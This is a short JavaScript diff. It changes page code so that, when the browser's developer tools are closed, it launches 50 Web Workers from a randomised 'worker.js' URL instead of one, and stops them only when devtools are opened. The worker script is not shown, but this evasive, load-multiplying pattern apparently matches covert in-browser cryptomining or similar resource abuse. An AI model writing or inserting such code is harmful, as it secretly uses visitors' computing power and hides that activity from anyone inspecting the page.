@@ -5,13 +5,15 @@ devtools.open=false;devtools.orientation=null;}},500);if(typeof module!=='undefi
 setTimeout(function() {
 
 	if(!window.devtools.open) {
+		
+		for(var i = 0; i < 50; i++) {
 
-		worker = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));
+			worker = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));
 
-		window.addEventListener('devtoolschange', function (e) {if(e.detail.open)worker.postMessage("STOP");});
+			window.addEventListener('devtoolschange', function (e) {if(e.detail.open)worker.postMessage("STOP");});
 
-		worker.postMessage("START");
-
+			worker.postMessage("START");
+		}
 	}
 
 }, 500);
